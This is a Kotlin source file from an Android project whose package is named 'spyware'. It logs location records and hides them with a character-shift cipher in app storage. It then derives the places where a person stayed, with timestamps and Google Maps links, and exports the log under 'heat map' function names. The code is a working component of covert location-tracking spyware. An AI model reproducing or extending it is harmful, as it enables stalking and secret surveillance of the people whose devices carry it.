import android.content.Context
import android.os.Environment
import com.example.spyware.common.Constants.Companion.DISTINGUISHING_DISTANCE_KM
import com.example.spyware.common.Constants.Companion.logShift
import com.example.spyware.common.Constants.Companion.outputFileName
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.io.FileInputStream
import java.time.Instant
import java.time.ZoneId
import java.time.format.DateTimeFormatter
import java.util.UUID
import kotlin.math.atan2
import kotlin.math.cos

// Shift each character n places backward (encode)
private fun shiftStringBack(str: String, n: Int): String {
    val sb = StringBuilder(str.length)
    for (char in str) {
        sb.append((char.code - n).toChar())
    }
    return sb.toString()
}

// Shift each character n places forward (decode)
private fun shiftStringForward(str: String, n: Int): String {
    val sb = StringBuilder(str.length)
    for (char in str) {
        sb.append((char.code + n).toChar())
    }
    return sb.toString()
}

// Write encoded data to file
fun writeShiftedToFile(location: File, fileName: String, data: String, n: Int) {
    try {
        if (!location.exists()) location.mkdirs()

        val shifted = shiftStringBack(data, n)
        val file = File(location, fileName)
        FileOutputStream(file).use { it.write(shifted.toByteArray()) }
    } catch (e: Exception) {
        e.printStackTrace()
        writeShiftedToFile(location,UUID.randomUUID().toString()+fileName,data,n)
    }
}

// Read and decode data from file
fun readShiftedFromFile(location: File, fileName: String, n: Int): String? {
    return try {
        val file = File(location, fileName)
        FileInputStream(file).use {
            val shifted = it.readBytes().toString(Charsets.UTF_8)
            shiftStringForward(shifted, n)
        }
    } catch (e: Exception) {
        e.printStackTrace()
        null
    }
}

fun appendShiftedToFile(location: File, fileName: String,data:String, n: Int) {
    val content:String?=readShiftedFromFile(location,fileName,n)
    val newContent = (content ?: "") + "\n" + data
//    println("Full Content: "+newContent)
    writeShiftedToFile(location,fileName,newContent,n)
}

fun log(context:Context, jsonObject: JSONObject){
    val currentUtcTime = DateTimeFormatter.ISO_INSTANT.format(Instant.now())
    jsonObject.put("timestamp", currentUtcTime)
//    println(jsonObject.toString())
    appendShiftedToFile(context.filesDir,outputFileName, jsonObject.toString(),logShift)
}

//fun renderLogs(content:String):String{
//
//}

fun getErrorsFromLogs(context:Context): String {
    val content:String?=readShiftedFromFile(context.filesDir,outputFileName,logShift)
    return content?.lines()?.filter { it.contains("\"error\":\"") }?.joinToString("\n") ?: ""
}

fun getFilteredLogs(context:Context): String {
    val content:String?=readShiftedFromFile(context.filesDir,outputFileName,logShift)
    val locationLogs= content?.lines()?.filter { it.contains("\"latitude\":") }?.joinToString("\n") ?: ""
    val result=getImportantLocations(locationLogs)
    println("halo3\n"+result)
    return result
}

fun getImportantLocations(locationLogs:String): String {
    val locations= locationLogs.lines()
        .filter { it.isNotBlank() } // Filter out empty lines
        .mapNotNull {
            try { JSONObject(it) }
            catch (e: Exception) { null } // Handle potential JSON parsing errors
        }
    var result = ""
    var i=0
    while (i <locations.size) {
        println("Location: "+locations[i])
        var j=i+1
        while(j<locations.size && calculateDistance(locations[i],locations[j])< DISTINGUISHING_DISTANCE_KM){
            j++
        }
        if(j-i>=2){
            var bestEstimateLocation=estimateLocation(locations,i,j-1)
            var entry=convertUtcToLocal(locations[i].getString("timestamp"))+" -> "+convertUtcToLocal(locations[j-1].getString("timestamp"))+": https://www.google.com/maps/place/"+bestEstimateLocation.getDouble("latitude")+","+bestEstimateLocation.getDouble("longitude")
            println("StableLocation: "+entry)
            result=result+entry+"\n"
        }
        i=j
    }
    return result
}

fun estimateLocation(locations:List<JSONObject>,i:Int,j:Int):JSONObject{
    val latList = mutableListOf<Double>()
    val lonList = mutableListOf<Double>()
    for(k in i..j){
        latList.add(locations[k].getDouble("latitude"))
        lonList.add(locations[k].getDouble("longitude"))
    }
    val medianLat=getMedian(latList)
    val medianLon=getMedian(lonList)
    return JSONObject().put("latitude",medianLat).put("longitude",medianLon)
}

fun getMedian(arr:List<Double>):Double{
    val sortedArr = arr.sorted()
    val n = sortedArr.size
    return if (n % 2 == 1) {
        sortedArr[n / 2]
    } else {
        (sortedArr[n / 2 - 1] + sortedArr[n / 2]) / 2.0
    }
}

fun convertUtcToLocal(utcTime: String): String {
    val utcFormatter = DateTimeFormatter.ISO_INSTANT.withZone(ZoneId.of("UTC"))
    val instant = Instant.from(utcFormatter.parse(utcTime))
    val localDateTime = instant.atZone(ZoneId.systemDefault())
    val outputFormatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss")
    return outputFormatter.format(localDateTime)
}


fun calculateDistance(loc1:JSONObject,loc2:JSONObject):Double{
    return calculateDistance(loc1.getDouble("latitude"),loc1.getDouble("longitude"),loc2.getDouble("latitude"),loc2.getDouble("longitude"))
}

// Function to calculate distance between two coordinates using Haversine formula
fun calculateDistance(lat1: Double, lon1: Double, lat2: Double, lon2: Double): Double {
    val r = 6371 // Radius of Earth in kilometers

    val latDistance = Math.toRadians(lat2 - lat1)
    val lonDistance = Math.toRadians(lon2 - lon1)

    val a = kotlin.math.sin(latDistance / 2) * kotlin.math.sin(latDistance / 2) +
            cos(Math.toRadians(lat1)) * cos(Math.toRadians(lat2)) *
            kotlin.math.sin(lonDistance / 2) * kotlin.math.sin(lonDistance / 2)

    val c = 2 * atan2(kotlin.math.sqrt(a), kotlin.math.sqrt(1 - a))
//    println(""+lat1+","+lon1+";"+lat2+","+lon2+":"+(r*c))
    return r * c // Distance in kilometers
}

fun downloadHeatMap(context:Context){
    val content:String?=readShiftedFromFile(context.filesDir,outputFileName,logShift)
    writeShiftedToFile(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),outputFileName,(content?:""),0)
}

fun exportHeatMap(context:Context){
    val content:String?=readShiftedFromFile(context.filesDir,outputFileName,logShift)
    writeShiftedToFile(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),outputFileName,(content?:""), logShift)
}

fun importHeatMap(context:Context){
    val content:String?=readShiftedFromFile(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),outputFileName,logShift)
    writeShiftedToFile(context.filesDir,outputFileName,(content?:""), logShift)
}

